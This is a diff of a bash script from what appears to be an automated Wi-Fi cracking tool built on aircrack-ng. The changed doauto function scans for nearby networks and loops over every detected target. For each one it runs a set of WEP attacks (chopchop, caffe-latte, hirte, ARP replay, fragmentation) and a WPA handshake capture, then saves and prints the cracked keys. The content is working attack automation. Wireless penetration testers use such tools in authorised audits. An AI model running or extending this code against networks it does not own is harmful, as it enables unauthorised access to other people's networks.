@@ -16,26 +16,31 @@
 #        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 # FUCKING UNPOLISHED, but... it seems to work.
 
-unknown(){
     #ap_array=`cat $DUMP_PATH/dump-02.csv | grep -a -n Station | awk -F : '{print $1}'`
     #head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv
-    return
-}
 
 count_aps(){ a=($(wc -l $DUMP_PATH/dump-02.csv)); echo ${a[0]}; } # benchmarks shows this is a little more efficent than using cut.
 
+autoscan_autopwn(){
+    launch_counter $time_to_scan &  
+        choosescan # Choose scan in auto auto auto mode.
+        sleep $time_to_scan && killall -2 "airodump-ng"; 
+    reload_config
+}
+
 doauto(){
-    source $path/autopwn
-    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0
+    source $path/autopwn;
+    export F=0; export AUTO=2; export QUIET=1; export INTERACTIVE=0; export ENCRYPT="";  #Set vars to quietest mode.
+
     autoscan_autopwn;
-    #unknown;
     cat $DUMP_PATH/dump-01.csv|sed -e '1,/BSSID/ s/.*//' -e '/Station/,$ s/.*//'|tac > $DUMP_PATH/dump-02.csv 2>/dev/null
     filter_ssid
     MAX_TARGETS=$(count_aps);
-    echo;
+
     attack_functions_wep=(wep_attacks_fakeauto wep_attacks_fakeinteractive wep_attacks_chopchop wep_attacks_caffelate wep_attacks_hirte wep_attacks_arpreplay_auto wep_attacks_arpreplay_interactive wep_attacks_fragmentation wep_attacks_chopchopclient wep_attacks_pskarp)
     attack_functions_wpa=(wpa_attacks_handshake)
-    tag; warn "${mark}Networks detected $MAX_TARGETS"; sleep 1
+
+    echo; tag; warn "${mark}Networks detected $MAX_TARGETS"; sleep 1
 
     for i in `seq 1 $MAX_TARGETS`; do
         tag; warn "${mark}Trying to crack target $i"
@@ -43,14 +48,15 @@ doauto(){
         export AUTO=2; selectAp;  sleep 1
         export writekey="-l $DUMP_PATH/$Host_MAC.key"
         if [ "$Host_SSID" != "" ]; then autopwn; 
-        else tag; warn "${mark}Couldn't find essid, next try"; fi
+        else tag; warn "${mark}Couldn't find essid, trying with next network."; fi
     done
-    cleanautovars
 
     tag; warn ${mark}"Cracked networks:"
     for file in $DUMP_PATH/*.key; do
         echo "\t${mark}$file : `cat $file`"
     done
+
+    reload_config
 }
 
 continue_autocrack(){
